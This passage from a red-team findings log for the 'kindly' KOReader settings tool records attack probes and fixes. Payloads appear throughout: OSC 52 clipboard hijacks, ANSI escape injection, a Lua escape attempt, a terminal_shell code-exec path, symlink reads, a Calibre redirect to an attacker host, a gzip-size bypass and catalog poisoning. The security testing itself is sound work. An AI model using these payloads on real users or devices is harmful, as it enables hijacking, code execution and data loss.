post-compromise persistence — once an attacker primitive has appended
a forged history line (S63), every subsequent `kindly history` run
triggers the clipboard write.

JSON mode (`cli/json.ts:82`) also emits the raw bytes in
`plugins.uncatalogued.detail` verbatim — `JSON.stringify` escapes to
``, safe for re-parsing but **not** safe for `cat`/`tail -f` of
the logged response.

**Severity framing.** Silent clipboard-write with attacker-controlled
contents. Chains:

1. **Ransom/phishing clipboard swap.** Attacker plants
   `\x1b]52;c;<base64 of attacker bitcoin address>\x07Bitcoin.koplugin`
   (or similar). User runs `kindly doctor` → clipboard now contains
   attacker's address. Later `CMD+V` in a crypto-transfer flow pastes
   attacker's address instead of the legitimate one.
2. **Paste-hijack for `kindly apply`.** Attacker swaps a YAML payload
   into the clipboard right before the user runs `kindly apply <paste>`
   in a "paste your config" workflow.
3. **II-chain at the moment of trust-granting.** `setup inspect`
   rendering an attacker's `.kset.yaml` with BOTH a bidi-spoofed
   `source_url` (S65) AND OSC 52 in the same field replaces the user's
   clipboard with an attacker-controlled `kindly setup import …`
   command *while* showing a legitimate-looking GitHub URL. Full
   phishing primitive: UI says "this is from github.com/kindly-proj",
   clipboard says `kindly setup import /tmp/attacker.kset`, user pastes
   in a trusted terminal.

**Defense.** S55's proposed §8.10 (shared stdout control-char
sanitizer) is the right shape — but its scope must explicitly cover
filesystem-sourced strings (plugin directory names, unknown settings
key names, history labels), not just manifest identity fields. Strip
all C0 (incl. ESC = `0x1B`) before any stdout write. The OSC 52
sequence starts with ESC, so strict C0 stripping catches it
incidentally. Also affects JSON mode (cli/json.ts:82) which currently
emits raw bytes — `JSON.stringify` escapes control chars to ``
etc., which is *safe for re-parsing* but still renders OSC 52 on
`cat` / `tail -f` of a logged JSON response. JSON emitter should
pre-sanitize (not just rely on JSON escaping) when the consumer may
`cat` the raw bytes.

---

### S67 — no file-lock on `settings.reader.lua` writes = lost-write race on desktop/emulator live-head (UU-probe, live-verified 2026-04-24)

**Invariant-violation for desktop KOReader. Live-verified 2026-04-24.**
Memory `project_kindly_device_mount_semantics` and CLAUDE.md both
rely on an implicit invariant: USB mount ⇒ KOReader exited ⇒ no
concurrent writers. That invariant holds for the Kindle mount target
but is violated for the **macOS KOReader-on-desktop live-head target**
(per `project_kindly_koreader_live_head`, adopted as the reference
runtime for kindly's red-team severity work). On that target, KOReader
is live during `kindly apply`, and both processes can write
`settings.reader.lua` concurrently.

`src/fs/safeWrite.ts` is a 6-step atomic write (archive → write .tmp
→ fsync → rename .old → rename .tmp → verify) — **atomic per write,
not per read-modify-write**. `mergeYamlIntoLua` (in apply.ts / diff.ts
callers) does: read device → merge YAML → safeWrite result. No
`flock`, no `proper-lockfile`, no advisory locking anywhere — grep
`flock|lockfile|lockSync|LOCK_EX` across `src/` returns zero hits.

**Live probe (UU-probe, 2026-04-24).** Scaffolded
`/tmp/kindly-uu-live/fixture/` with a three-key settings file. Started
a tight bash loop writing `koreader_write_iter=N` and
`bookmarks_items_per_page=42` in 3000 iterations (simulating KOReader's
`luasettings:flush` cycle). Concurrently fired 5 `kindly apply` commands
setting `cover_image_quality=75`. Final state on disk:

```
cover_image_quality    = 10       (kindly's 75 was overwritten)
bookmarks_items_per_page = 42     (simulated writer's value)
koreader_write_iter    = 3000     (simulated writer's last iteration)
```

Both directions of lost-write are structurally possible (intermediate
states during the race would show kindly clobbering writer's values
too). Exit 0, no warning. Kindly's verify step (safeWrite.ts:122-133)
re-reads and matches — but only against the content kindly *intended*
to write, not against "what was on disk when we started reading". TOCTOU
window between read and safeWrite is measured in bun-startup latency
(~50-200ms), which is trivial to hit when KOReader saves every few
seconds.

**Severity framing.** LOW on Kindle (USB-mount-gate holds). MEDIUM on
macOS/Linux desktop (live-head). Relevant for:

- Red-team validation workflow itself (this is how the live-head target
  operates — probes could be getting polluted by auto-save).
- `kindly watch`'s docs/97 GUI vision (explicit concurrent kindly +
  KOReader by design).
- Anything that runs kindly against a KOReader running inside the same
  OS user session (docker-less dev loops, pairs-programming setups).

Not a classic security boundary — no privilege crossing — but a
silent-data-loss correctness gap that undermines the atomicity guarantee
kindly's own docstring promises ("atomic writes and verification").

**Defense.** Advisory file lock on `settings.reader.lua` across the
entire read-modify-write window:

1. `open(settingsPath, O_RDONLY)` + `flock(fd, LOCK_EX)` before
   `readFileSync`.
2. Hold the lock through merge and safeWrite's rename sequence.
3. Release on completion or on error (unwind via `finally`).

POSIX `flock` (via `node-fs-ext` or a small C addon, or using
`proper-lockfile`'s lockfile-sidecar approach) coordinates kindly
with kindly (multiple concurrent `kindly apply`s). It does **not**
coordinate with KOReader unless KOReader also takes the lock —
which it doesn't. So a sidecar `settings.reader.lua.lock` file that
kindly respects, plus a feature request upstream for KOReader to
honor it, is the longest-horizon fix. Near-term: lockfile covers
kindly/kindly races and at least makes the kindly-side semantic
coherent.

---

### S55 — `kindly doctor` ANSI injection via plugin dir names / unknown settings keys (live-verified)

**New ANSI-injection surface. Live-verified 2026-04-23.** S7/S40 covered
ANSI in manifest identity fields rendered by `setup import` / `setup
show`. S55 extends to `kindly doctor` output — a command users run
*precisely when something feels off*, so poisoned output is maximally
load-bearing at the worst moment.

**Two injection sites in `src/lib/doctor.ts`:**

- **Line 217** (`src/lib/doctor.ts`) — `detail: sample.join(", ")` where
  `sample` is drawn from settings-keys-present-but-not-in-curated-
  schema. Attacker settings key like `["\x1b[2J\x1b[HFAKE"] = 1`
  (delivered via S38/S42/S43/S44/S46/S48 apply-side primitives) flows
  verbatim to stdout as the detail text.
- **Line 381** — `detail: uncataloguedPlugins.sort().join(", ")` where
  `uncataloguedPlugins` is built from `readdirSync` on the plugins
  directory. Attacker plugin dir named `\x1b[31;1mEVIL.koplugin`
  (deliverable via S44/S46/S51 tar-ingestion; `isSafeRelativePath` in
  `src/fs/paths.ts:10-20` permits all bytes except `\0`, leading `/`,
  `\`, and `..`) flows through `readdirSync` → `uncataloguedPlugins`
  → `detail` → `env.stdout.write`.

**Live probe 2026-04-23:**
```
mkdir -p /tmp/kindly-s55-live/fixture/koreader/plugins
mkdir "/tmp/kindly-s55-live/fixture/koreader/plugins/$(printf '\x1b[31;1mEVIL-plugin.koplugin')"
touch "…/main.lua"
bun run src/cli.ts doctor --mount /tmp/kindly-s55-live/fixture
```

Output piped through `cat -v`:
```
plugins
  ⚠ 0 verified, 0 tampered, 1 uncatalogued
  ✓ 1 uncatalogued plugin(s) installed  ^[[31;1mEVIL-plugin
```

The `^[[31;1m` is a literal ESC byte `0x1B` followed by `[31;1m` — red-
bold SGR. In a real terminal, the rest of the line and the next
category header ("disk") would render red-bold until a reset code
fires. With `\x1b[2J\x1b[H` instead, the attacker clears the screen
and repositions the cursor; with `\r\x1b[K` they overpaint the
preceding `⚠` warning with `✓` fake-success.

**Chains that make S55 nasty.**
- `kindly restore <attacker.tar.gz>` (S46) delivers the ANSI-named
  plugin dir. User runs `kindly doctor` to check integrity. Doctor
  emits a **fake green "✓ verified"** line because the ANSI from the
  plugin name colors/overwrites the `⚠` warnings that followed.
- `kindly apply` with a SENSITIVE-bypassed settings file (S42) delivers
  an ANSI-named unknown key. Doctor's schema-drift section (line 217)
  gets poisoned — the user reading `kindly doctor` sees a clean run
  while 20 attacker SENSITIVE keys sit on device.

**Defense.** Single shared `stripControl(str)` helper that strips
`[\x00-\x08\x0B-\x1F\x7F]` plus quotes `\t`/`\n`/`\r` for display.
Apply to:
- `src/lib/doctor.ts:217` (unknown-keys sample)
- `src/lib/doctor.ts:330-331` (tampered plugin `${name}` / `${f.file}`)
- `src/lib/doctor.ts:361, 380-381` (uncataloguedPlugins labels)
- Same helper already needed for S7/S40 (`renderImportAuthorBlock`)
- Also needed for `kindly history` human renderer (`commands/history.
  ts:112-117`) — `e.label` is user-typed but reaches stdout raw,
  exploitable via S53 write-access path.

Folds into a new **§8.10 — shared stdout control-char sanitizer** (or
extends §8.3 which currently scopes only to setup-import identity
fields).

Fixture: `/tmp/kindly-s55-live/`. No KOReader launch needed — pure
CLI-output primitive.

---

### S56 — mount-side symlink on `settings.reader.lua` = cross-read + covert destruction (other-AI P-probe)

**Sibling to S50 on the *primary-read* path rather than the *archive-
extract* path.** S50 showed symlinks *inside tars* bypass kindly's
path-safety on `kindly restore/rollback`. S56 shows symlinks *on the
mount itself* bypass every read path across `pull`, `diff`, `apply`,
`doctor`, `setup inspect`, `setup import`, `plugin`, and `rollback`.

**The gap.** Every primary-read of `settings.reader.lua` uses plain
`readFileSync` — which *follows symlinks*. No `lstatSync` / `realpath`
guard anywhere on `mount.settingsPath`:

- `src/lib/pull.ts:36`
- `src/lib/diff.ts:35`
- `src/lib/apply.ts:40`
- `src/lib/doctor.ts:88`
- `src/lib/setupInspect.ts:168`
- `src/lib/importSetup.ts:549`
- `src/commands/plugin.ts:42`
- `src/commands/rollback.ts:140-143`

The only `lstatSync` calls are in `src/setup/unpack.ts:86, 126` — those
belong to S50's archive-extraction path, not this one.

**Primitive.** Attacker with temporary write access to the Kindle
mount (USB brief-window scenario, shared-fs, compromised sync daemon)
replaces `koreader/settings.reader.lua` with a symlink to an arbitrary
host file (e.g. `~/.config/koreader/settings.reader.lua` on Linux
desktop, sibling kindly profile, a different user's mounted home,
Time Machine snapshot, `/etc/passwd`).

- `kindly pull`: reads the symlink target, parses as Lua. If the
  target is shaped like `settings.reader.lua` (a sibling install, a
  backup snapshot) → non-SECRET contents land in `kindly.yaml`. If
  the target is non-Lua (`/etc/passwd`) → `parseSettingsFile` throws
  and raw bytes don't reach YAML, but the path is echoed.
- `kindly diff`: prints bridged target's content as `prev` (line 35)
  — stdout dumps somebody else's settings file.
- `kindly apply`: `safeWrite` does `renameSync(path, oldPath)` +
  `renameSync(tmpPath, path)`. `renameSync` acts on the **symlink
  entry itself** (not the target) — so `apply` **REPLACES the symlink
  with a regular file**. The symlink target is not written through
  (good — no arbitrary host-file clobber), but the symlink itself
  disappears: a **covert destruction primitive** that destroys
  evidence of the bridged-read, then plants a real file where the
  user's Kindle expected one. Next boot, KOReader reads what kindly
  apply wrote — the user's settings quietly migrated into whatever
  YAML they applied.
- `kindly doctor` emits `settings.reader.lua parseable (N keys)`,
  cheerful green check, no lstat.

**Live-attack shape (macOS).**
`/Volumes/Kindle/koreader/settings.reader.lua →
~/.config/koreader/settings.reader.lua` (user's desktop KOReader
profile). Victim runs `kindly pull` to "back up my Kindle." Desktop
profile contents land in `kindly.yaml`. Paired with a tricked
`kindly apply` (or any mutation): symlink gets clobbered, desktop
profile becomes uncorrelated with Kindle's real settings.

**Defense.** `lstatSync(path).isSymbolicLink()` check before every
primary read; reject with a SECURE-error "settings path is a symbolic
link — kindly refuses to read or write through symlinks on the
device." One shared helper called at all 8 sites above. Applies to
both read AND write paths (the S50 `tar -tvzf` mode-column filter
doesn't help here because this primitive doesn't go through tar).

Credit: other-AI P-probe, static-confirmed 2026-04-23; live repro
path documented but not executed.

---

### S57 — `setup import --dry-run` leaks SENSITIVE values (other-AI Q-probe, S48 sibling)

**S48 variant on the import-side dry-run renderer.** S43b/S48 confirmed
the `apply --dry-run` / `apply --json` / `diff --json` leak on the
Change.prev/Change.next values. Q-probe confirms the same primitive on
`setup import --dry-run` / `setup import --json` — but with a narrower
value class.

**Findings:**

- **SECRETs are filtered cleanly.** `filterForYaml` (`src/schema/
  classify.ts:228`) runs on `manifestFlat` at `src/lib/importSetup.ts:
  543` **before** `computeChanges`. Manifest-side SECRETs are dropped.
  Additive-mode `computeChanges` walks manifest keys only → device-
  side SECRETs never enter `changes`. Replace-mode `preservedKeys`
  skips removed SECRETs (`src/lib/importSetup.ts:553-558`, `src/
  schema/diff.ts:80`). Nested secrets (`kosync.password`) are scrubbed
  and `diffInto` only recurses into keys present in `next`. **No SECRET
  values leak.**
- **SENSITIVE values DO leak.** `renderSetupImport` at `src/commands/
  setup.ts:941-951` prints `fmtValue(c.prev) → fmtValue(c.next)` raw
  for every change — **including those flagged `[SENSITIVE]`**. The
  helper `fmtValue` at `setup.ts:682` has zero redaction. **The
  SENSITIVE gate at `src/lib/importSetup.ts:605` is explicitly skipped
  when `opts.dryRun` is true** — so the dry-run preview runs to
  completion with every SENSITIVE `prev → next` pair printed.
- **`--json` equivalent.** `publicData.changes` at `setup.ts:1066`
  carries raw `prev`/`next` `LuaValue`s — CI/automation pipelines
  consuming JSON envelope land every SENSITIVE value structurally.
- **Strict-imports flow.** `formatSensitiveChange` at `src/lib/
  importSetup.ts:594-603` builds the error message itself from
  `fmtValue(prev) → fmtValue(next)` — so even the **failure-mode
  stderr of strict-mode** carries the values.

**Primitive.** Attacker ships a `.kset` with a SENSITIVE `prev → next`
pair they want to observe (e.g., attacker's chosen `ota_server` +
`http_proxy` + `extra_plugin_paths` values). Victim runs `kindly
setup import foo.kset --dry-run` to "preview what it would change."
Victim's current `ota_server` / `http_proxy` / SSH-surface values hit
stdout. Paired with S43b's `apply --dry-run` leak: together these
cover both apply and import preview paths. The `--dry-run` +
`--strict-imports` combo *additionally* dumps SENSITIVE values into
stderr (the strict-mode error renderer), which is captured by most
CI systems.

**Novel contribution over S48.** S48 was apply-side only
(`computeChanges` → `diff --json` / `apply --json` / `apply --dry-
run`). S57 establishes: (a) the same leak shape repeats in `setup
import` renderer with its own `fmtValue` — fix requires patching both
paths, not just one; (b) **the dry-run bypass of the SENSITIVE gate is
itself a distinct bug** (dryRun=true skipping trust gates = design
error: dry-run should surface *more* trust warnings, not fewer); (c)
strict-imports **error-message construction** uses `fmtValue` — so
errors also leak.

**Defense.** Fold into §8.4's "shared SECRET/SENSITIVE redactor" but
widen scope from SECRETs to *both classes*:
- One `fmtValueRedacted(value, key, classify)` helper in classify.ts
  that returns `"<redacted:ota_server>"` for SENSITIVE and
  `"<redacted:password>"` for SECRET.
- 3 call sites in apply (S48), 3 in setup (`renderSetupImport`,
  `formatSensitiveChange`, `publicData.changes` JSON), 2 in diff
  (`diff --json`, human).
- Also fix the dry-run gate bypass: SENSITIVE gate at `importSetup.ts:
  605` should run even when `dryRun=true`, emit exit-3 after printing
  (not *instead of* printing).

Credit: other-AI Q-probe, static-confirmed 2026-04-23; S48 canonical
fix site, widen scope.

---

### S18 — replace-mode strips user's SENSITIVE hardening (defended)

Device seeded with explicit user hardening: `SSH_key_only_auth: true`,
`SSH_port: 22222`, `plugins_disabled: {SSH, terminal}`, custom
`ota_server`, `debug: false`. Attacker ships replace-mode `.kset` with
*only* `refresh_rate: 12` in settings.

Hypothesis: replace-mode wipes everything not declared, including
SENSITIVE keys, without re-firing the gate (since the gate was
originally designed around *added* sensitive values).

Re-verify shows gate DOES handle removals:

```
error: this Setup modifies 6 security-sensitive setting(s):
  [ssh] SSH_allow_no_password: false → (removed)
  [ssh] SSH_autostart: false → (removed)
  [ssh] SSH_key_only_auth: true → (removed)
  [ssh] SSH_port: "22222" → (removed)
  [debug] debug: false → (removed)
  [network] ota_server: "…" → (removed)
EXIT: 3
```

W31 covers removal direction too. No action.

**But** the same diff includes a plain non-SENSITIVE line:

```
- plugins_disabled  (was {"SSH":true,"terminal":true})
```

`plugins_disabled` removal ≡ re-enable every built-in plugin the user
had turned off (Terminal, SSH, etc.). Not flagged SENSITIVE. Same
classification gap as S17 — reinforces the "add `plugins_disabled` to
SENSITIVE_KEYS" fix.

---

### S20 — type-mismatch structure corruption

Manifest with intentional type-wrong values for known keys:

```yaml
settings:
  home_dir: 42                                  # expected string
  kosync: "not-a-table"                         # expected table
  plugins_disabled: "scalar-instead-of-dict"    # expected table
```

Output:

```
warn: schema: 3 type mismatch(es):
  - home_dir: expected string, got number
  - kosync: expected table, got string
  - plugins_disabled: expected table, got string
4 change(s) to apply:
  ~ [SENSITIVE] home_dir  "/mnt/us/Books" → 42
  ~ kosync  {"auto_sync":false,…,"userkey":"7f8a8d…","username":"…"} → "not-a-table"
  ~ plugins_disabled  {…}  → "scalar-instead-of-dict"
```

Two concerns:

1. Type mismatches are a **warning, not a block**. If the user accepts
   the SENSITIVE prompt (because `home_dir` is changing), the
   type-corrupt values for `kosync` and `plugins_disabled` apply too.
   KOReader plugin loader will crash on the next read of
   `plugins_disabled` (expected dict, got string). Net effect: the
   `.kset` poses as a home_dir setter, actually bricks kosync sync
   credentials and disables the plugin system.
2. The pre-image diff prints the live `kosync.userkey` value
   (`"7f8a8d…"`) to stdout. Dry-run output copy-pasted to a support
   forum leaks the user's kosync credential. `kosync.userkey` is in
   `SECRET_PATHS` and is correctly filtered from *exports* — but the
   diff renderer shows the *current* on-device value when displaying
   what a proposed change would overwrite. Separate renderer surface
   from what `classify.ts` protects.

**Severity.** Low-medium — requires user to accept a SENSITIVE prompt
to activate the corruption; the info-leak is only exploitable if the
user pastes a dry-run trace. But both are easy to fix.

**Mitigations:**

1. Type-mismatch on a known-typed key should be a policy-block (exit 3)
   by default, not a warning. Opt-out `--allow-type-mismatch` for
   edge cases.
2. The diff renderer's "current value" side should redact SECRET keys
   regardless of whether the *new* value triggers SENSITIVE — the
   renderer is a separate surface from the export filter.

---

### S25 — ANSI escapes in settings VALUES (defended)

Extension of S7. What if the attacker puts ANSI escapes inside
settings *values* (not meta fields)?

```yaml
settings:
  home_dir: "/mnt/us/evil\e[2K\r/mnt/us/documents"
  ota_server: "https://evil.example\e[2K\r  ota_server:    https://koreader.rocks"
```

Raw-byte inspection via `od -c` of the CLI output: ESC bytes (`\x1b`)
absent. Values render as `[2K\r…` — literal escape sequence,
cosmetically ugly but not executed by the terminal. Zero `esc [` byte
pairs in the diff output.

The settings-value renderer serializes via JSON-ish escaping, so C0
control chars come out as `\uXXXX`. Different code path from the
meta-field renderer that S7 exploits. **No action on this surface** —
but the gap matters for S7: the SAME sanitization should apply to
meta fields. The existence of S25's correct behavior is evidence that
the fix for S7 is just "route meta fields through the same escaper".

---

### S27 — plugin re-enable primitive generalizes across all built-ins

S17b showed `plugins_disabled.SSH: false` re-enables SSH silently.
Sweep across six plugins confirmed this is a **generic primitive**,
not SSH-specific:

| Plugin | Risk on re-enable | Verdict |
|--------|-------------------|---------|
| `SSH` | starts network shell service (if SSH_autostart also true) | exit 0, silent |
| `httpinspector` | starts HTTP debug endpoint | exit 0, silent |
| `LocalSend` | file-share daemon, discoverable on LAN | exit 0, silent |
| `calibre` | Calibre wireless sync, exposes device | exit 0, silent |
| `wallabag` | credential-consuming sync plugin | exit 0, silent |
| `opds` | OPDS catalog network fetch | exit 0, silent |
| `vocabbuilder` | low-risk but still user's choice | exit 0, silent |

Every re-enable via `plugins_disabled.<name>: false` is a single-line
settings write that the W31 gate does not see. The user's "I
disabled this" intent is silently overturned.

This is **not** a per-plugin gap to patch — it's a whole-class miss.
`plugins_disabled` flipping any plugin from `true` → `false` (or
omitting an entry that was `true`) should be SENSITIVE as a class.

---

### S28 — `profiles_autoexec` direct write (low severity)

```yaml
settings:
  profiles_autoexec:
    Start:
      attacker_profile: true
```

Output: `EXIT: 0`, one change line, no warning.

**Why severity is low:** `profiles_autoexec` only maps
event-name → profile-name → bool. The actual profile *bodies* live
in `<koreader>/settings/profiles.lua`, which is outside kindly's write
scope (kindly only touches `settings.reader.lua`, `plugins/`,
`patches/`). An attacker who only controls a `.kset` can flip which
profiles auto-execute, but cannot inject a new profile body. Requires
the target to already have a privileged-enough profile named
`attacker_profile` on-device — not achievable via `.kset` alone.

Still worth noting: if the attacker chose a generic profile name that
a real user might have (e.g., `Night`, `Reading`), and that profile
flips to a startup event, the user's existing behavior subtly changes.
Low-impact UX trickery rather than code-exec.

No fix required; file under "known minor".

---

### S30 — Lua-writer string-escape injection (defended)

Can an attacker craft a settings value that, when serialized by
`src/lua/writer.ts` into `settings.reader.lua`, breaks out of the
Lua string literal and injects code?

Payload:

```yaml
settings:
  lastdir: "/mnt/us/Books\"] = nil; os.execute(\"echo pwned\"); return {[\""
```

On-disk output after import:

```lua
["lastdir"] = "/mnt/us/Books\"] = nil; os.execute(\"echo pwned\"); return {[\"",
```

Writer correctly double-escapes the embedded `"` as `\"` — KOReader
will parse this as the literal string
`/mnt/us/Books"] = nil; os.execute("echo pwned"); return {["`. No
Lua-code escape. **No action.**

---

### S11 — partial shadow: extra file inside catalog-match plugin (defended)

Take the verbatim `bookshortcuts.koplugin` from the KOReader source
tree (both files match the catalog exactly), then inject a third file
`helper.lua` inside the same plugin directory. Pack as a fat `.kset`.

Hypothesis: if the verifier treats a plugin as an opaque bundle
identified by name, the extra file could slip past under BUNDLED_MATCH.

Read of `src/catalog/verify.ts:78-87` shows per-file comparison: any
file in the archive not present in `known_hashes` produces an `extra`
verdict → plugin MISMATCH.

End-to-end verify:

- `--accept-plugins --strict-imports` →
  ```
  error: --strict-imports: 1 plugin integrity finding(s):
    [MISMATCH] bookshortcuts
  EXIT: 3
  ```
- `--accept-plugins` (no strict) →
  ```
  warn: Plugin hash verification:
    bookshortcuts.koplugin: MISMATCH
      extra: helper.lua (not in catalog)
  EXIT: 4
  ```

Strict blocks. Non-strict surfaces a specific, actionable warning
("extra: helper.lua") rather than a silent pass. No action.

---

### S10 — settings-only Calibre sync redirect (defended, for the record)

Hypothesis: an attacker ships a lean `.kset` that sets
`calibre_wireless_url = {address: attacker.example.com, port: 9090}`,
redirecting the user's Calibre wireless sync to an attacker-controlled
host. Real key: `plugins/calibre.koplugin/wireless.lua:254` passes the
setting's `address`/`port` fields straight into the network client.

Initial suspicion was that this was unlisted. Re-read of
`src/schema/classify.ts:45-96` shows `calibre_wireless_url` **is** in
`SENSITIVE_KEYS` with domain `network`.

End-to-end verify: lean `.kset` with just that one key.

```
error: this Setup modifies 1 security-sensitive setting(s):
  [network] calibre_wireless_url: (added) → <object with 2 key(s)>
EXIT: 3
```

W31 gate blocks. Exit 3 (policy-block) as designed. No action. The
surrounding network-endpoint cluster (`ota_server`, `http_proxy*`,
`trans_server`, `zlibrary_base_url`, `opds_servers`) is the same shape
and is already covered.

---

### S9 — `terminal_shell` as settings-only code-exec vector

Real KOReader plugin `terminal.koplugin/main.lua:193,249`:

```lua
local shell = G_reader_settings:readSetting("terminal_shell")
…
if (rlw and C.execlp(rlw, rlw, shell, unpack(args)) ~= 0)
    or C.execlp(shell, shell, unpack(args)) ~= 0 then
```

Direct `execlp()` of the string stored under `terminal_shell`. A lean
`.kset` carrying only:

```yaml
settings:
  terminal_shell: /mnt/us/.pwn/evil.sh
```

imports with no SENSITIVE gate, no warning, no `--accept-sensitive`
required. Confirmed output:

```
2 change(s) to apply:
  ~ refresh_rate  4 → 8
  + terminal_shell  = "/mnt/us/.pwn/evil.sh"
EXIT: 0
```

Trigger path on-device: user opens the Terminal plugin from the tools
menu, which does `execlp(shell, …)` with the attacker-controlled path.
Not drive-by — requires user action — but the SENSITIVE class exists
precisely for "setting that redirects code/config to an
attacker-controlled location" and `terminal_shell` is textbook.

`SENSITIVE_KEYS` in `src/schema/classify.ts` currently covers
`extra_plugin_paths` (code-exec), the network-endpoint cluster
(`ota_server`, `http_proxy*`, `calibre_wireless_url`, `trans_server`,
`zlibrary_base_url`, `opds_servers`), SSH surface, autostart services,
and the directory-redirection cluster (`home_dir`, `download_dir`,
`inbox_dir`, `LocalSend_save_dir`, `LocalSend_ext_dirs`) — but **not**
`terminal_shell`.

**Severity.** Medium — requires user to open the terminal plugin to
trigger, but represents an unlisted code-exec surface that the
SENSITIVE class was explicitly designed to catch. Add `terminal_shell`
to `SENSITIVE_KEYS` with domain `code-exec`.

**Adjacent keys worth auditing in the same patch** (confirmed real
KOReader settings, not in `SENSITIVE_KEYS`, pure write-path redirection
— lower severity than `terminal_shell` but inconsistent with the
existing `*_dir` coverage):

- `screenshot_dir` — `frontend/ui/widget/screenshoter.lua:43`
- `screensaver_dir` — `frontend/ui/screensaver.lua:180`
- `wikipedia_save_dir` — `frontend/apps/reader/modules/readerwikipedia.lua:211`
- `cover_image_path` / `cover_image_fallback_path` / `cover_image_cache_path`
  — `plugins/coverimage.koplugin/main.lua:76-85`

`profiles_autoexec` is a separate class: it only toggles which named
profiles auto-run on events (Start/Suspend/Resume/…). The profile
*definitions* live in `<koreader>/settings/profiles.lua`, which is
outside kindly's install scope (kindly only writes `settings.reader.lua`
and `plugins/` + `patches/`). Low severity — an attacker who only
controls the `.kset` cannot inject profile bodies, only flip which
already-present profiles auto-run.

---

### S68 — gzip ISIZE 4 GiB wrap bypasses `enforceSizeCaps` (YY-probe, live-verified 2026-04-24) — **High**

`src/fs/archive.ts:135-148` reads uncompressed size via `gzip -l`,
which parses the 4-byte ISIZE trailer — uncompressed size **mod 2³²**.
Any tar.gz whose actual uncompressed stream is ≥ 4 GiB has its
reported size wrap modulo 4 GiB, then slips through all three caps in
`enforceSizeCaps` (`:153-183`):

- archive bytes cap (100 MiB) — **pass** (bomb is 4.08 MiB on disk)
- uncompressed bytes cap (500 MiB) — **pass** (ISIZE reports 100 MiB wrapped)
- ratio cap (100:1) — **pass** (100 MiB / 4 MiB ≈ 25:1)

**Attacker artifact.** `bomb_wrap.tar.gz` — single tar entry
`wrapbomb.bin`, header size `4,399,822,848` bytes (≈ 4.1 GiB of
zeros), compressed to 4.08 MiB. `tar -tvzf` honestly reports the
4.1 GiB header size; `gzip -l` lies (wraps).

**Reachability.** Caller invokes `assertSafeArchive(archive)` → passes.
Then `extractTarGz(archive, dest)` (`:219` = `tar -xzf`) writes
the full 4.1 GiB to disk. Reachable from:

- `src/commands/restore.ts:81` (pre-check) → `:136` (extract)
- `src/setup/unpack.ts:83`

**Disk-fill DoS on device.** Kindle internal storage is ≈ 8 GiB. Scale
payload to 8 GiB + 400 MiB uncompressed → ISIZE wraps to 400 MiB
(still under 500 MiB cap), compressed stays ~8 MiB, extraction fills
device. Bricks KOReader by exhausting internal storage; on desktop
fills `/tmp`.

**Root cause.** ISIZE is a 32-bit field; gzip format *cannot* represent
uncompressed sizes ≥ 4 GiB truthfully. Any cap based solely on `gzip -l`
is bypassable by construction. This is the **first confirmed bypass of
the A9/S-series bomb defense** — S-series probes all used honest
ISIZE values and correctly tripped the caps.

**Fix.** Stream-decompress through a counting sink and abort once
byte `cap + 1` is observed (authoritative — doesn't depend on trailer).
Secondary belt: sum `tar -tvzf` entry sizes as a cross-check (in this
probe the tar header *did* report 4.1 GiB).

**Severity: High.** Direct bypass of the bomb defense, reachable on
both restore and setup unpack. Attacker needs to get a `.kset` or a
backup tarball in front of the user — same footprint as S44/S46 —
and the blast radius is disk-fill DoS, not code execution, so this
ranks below the code-drop scenarios but above the warn-only surfaces.

---

### S72 — Catalog-file poisoning inverts W32/W34e MATCH gate and silences scanner (AAA-probe, live-verified 2026-04-24) — **High**

Root of the trust pyramid. `src/catalog/reader.ts:109-134`
`loadPluginCatalog` reads `data/catalog/plugins.bundled.v1.json`
via plain `readFileSync` + Zod schema validation. **Zero integrity
check on the file itself** — no embedded SHA in source, no
signature, no pinning, no subresource-integrity cross-check. Grep
`catalog.*(sha\|hash\|digest\|integrity\|signature)` across `src/`
returns only references to per-plugin `known_hashes` *inside* the
catalog, never to a hash *of* the catalog.

**Live probe.** Wrote `/tmp/kindly-aaa-live/probe.ts` which:

1. Loads real catalog → `verifyPluginAgainstCatalog("SSH",
   {main.lua: attacker_bytes}, catalog, "subset")` → **MISMATCH**
   (correct baseline).
2. Reads catalog JSON, replaces `SSH.known_hashes["main.lua"]`
   with `sha256:<sha of attacker bytes>`, writes `/tmp/.../
   poisoned.json`.
3. `loadPluginCatalog("/tmp/.../poisoned.json")` → same API,
   same Zod schema validation (passes cleanly) → verify against
   attacker bytes → **MATCH**.

Zod caught the wire format on the first run (`known_hashes`
values must match `/^sha256:[a-f0-9]{64}$/`) — that's schema
validation, not integrity. Once the hash is prefixed correctly,
Zod passes and attacker bytes verdict MATCH.

**Bonus: scanner is also silenced.** `commands/setup.ts:829`
logs `"(N file(s) suppressed by catalog hash match)"` — the
scanner's pipeline suppresses lexical advisories on files whose
bytes match `known_hashes`. A poisoned catalog not only inverts
MATCH but also silences every scanner finding on the attacker
plugin. Double-win: the reviewer sees "MATCH ✓ trusted" with
zero scanner output.

**Why this is the highest-severity finding on the board.**

- **Inverts every other defense.** W32 MATCH gate, W34e scanner
  suppression, `--strict-imports` (which requires MATCH) all
  collapse into attacker-controlled boolean.
- **No UI surface fires.** Unlike S3/S4 which surface an
  `UNCATALOGUED` or scanner advisory that the user can notice,
  AAA produces a pristine MATCH with no warning text anywhere.
- **Persistence is one-shot.** Attacker writes the file once;
  every future `kindly setup import` / `kindly doctor` on that
  install trusts the forgery until the user reinstalls.
- **Beats the HMAC marker proposal** (§8.7). The HMAC gate
  authenticates **archives** against the machine-local key;
  it does not authenticate the **catalog** against which
  scanner findings and plugin hashes are checked. AAA attacks
  upstream of the HMAC layer.

**Threat model.** Requires attacker with write access to the
kindly install directory. Realistic paths:

- **Supply-chain.** kindly distributed via npm/bun/homebrew/
  `bun install` from a git tag. A compromised package ships a
  poisoned catalog; every install is owned from day zero.
  `data/catalog/` is in the tarball — standard package layout.
- **Post-install tampering.** Shared dev machine, privilege-
  escalation chain, sandboxed-process escape → one-time
  catalog rewrite enables every future import MATCH.
- **Dotfiles sync.** User's dotfiles-synced `~/Projects/kindly/`
  gets altered on the sync server; next pull brings the poison
  home.

**Fix space.**

- **Preferred: compile-time embedded hash.** Ship a constant
  `CATALOG_SHA256 = "sha256:…"` in `src/catalog/reader.ts`
  source. Loader computes SHA over `readFileSync` bytes and
  throws on mismatch. Attacker modifying the catalog must also
  modify a `.ts` file — which is code-exec-equivalent, so the
  attack collapses to "attacker already has RCE."
- **Secondary: install-time integrity snapshot.** On first
  run, record catalog bytes' SHA into `~/.kindly/install-
  integrity.json` (chmod 0600, §8.9 scope). Compare on every
  load. Catches post-install tampering; doesn't defend
  supply-chain compromise (install-time integrity was already
  owned).
- **Tertiary: Ed25519-signed catalog.** Catalog ships with
